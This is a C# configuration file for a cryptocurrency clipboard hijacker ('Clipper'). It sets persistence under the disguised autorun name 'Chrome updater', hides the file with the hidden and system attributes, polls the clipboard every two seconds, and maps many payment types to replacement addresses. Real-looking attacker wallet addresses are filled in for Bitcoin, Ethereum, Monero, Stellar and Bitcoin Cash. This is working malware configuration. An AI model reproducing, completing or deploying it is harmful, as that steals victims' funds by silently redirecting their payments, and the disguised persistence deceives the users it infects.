using System.Collections.Generic;

namespace Clipper
{
    internal sealed class config
    {
        // Autorun
        public static bool autorun_enabled = true;
        public static string autorun_name = "Chrome updater";
        // Set 'hidden' attribute
        public static bool attribute_hidden = true;
        // Set 'system' attribute
        public static bool attribute_system = true;
        // Clipboard check delay in seconds
        public static int clipboard_check_delay = 2;
        // Replace to
        public static Dictionary<string, string> addresses = new Dictionary<string, string>()
        {
            // WebMoney
            {"wmr", "" },
            {"wmg", "" },
            {"wmz", "" },
            {"wmh", "" },
            {"wmu", "" },
            {"wmx", "" },

            // Qiwi
            {"qiwiua", "" }, // UA
            {"qiwiru", "" }, // RU
            // Yandex money
            {"yandex", "" },
            // Steam trade url
            {"steam", "" },
            // Cryptocurrency
            {"btc", "1AzxXLqLABEo5zSQhp1qJVAsx9CYX86vfU" }, // Bitcoin
            {"eth", "0x357C0541F19a7755AFbF1CCD824EE06059404238" }, // Ethereum
            {"xmr", "42747pT2PCYYUszYvdQH5XDNkFieRk2THJ6hdC1vWGN5VTFdx4CWKRpYqevFKZQXTcFfAbKEqoFwGBkHCbq3GVHCNVbZxRd" }, // Monero
            {"xlm", "GBMNM7KM7CKNK4BNOPWCXRDZ4HI572RW4V7TEJSCHPUFTS5I4BFIW7IY" }, // Stellar
            {"xrp", "" }, // Ripple
            {"ltc", "" }, // Litecoin
            {"nec", "" }, // Neocoin
            {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" }, // Bitcoin Cash
            {"bcn", "" }, // Bytecoin
            {"ada", "" }, // Cardano
            {"grft", "" }, // Graft
            {"zcash", ""}, // Zcash
            {"btg", "" }, // Bitcoin Gold
            {"waves", "" }, // Waves
            {"rdd", "" }, // ReddCoin
            {"blk", "" }, // BlackCoin
            {"emc", "" }, // Emercoin
            {"strat", "" }, // Stratis
            {"qtum", "" }, // Qtum
            {"via", "" }, // Viacoin
            {"lsk", "" }, // Lisk
            {"doge", "" }, // Dogecoin
            {"dash", "" } // Dashcoin
        };

        // Mutex (random)
        public static string mutex = "a111sfrewrfwerewsf231";

    }
}
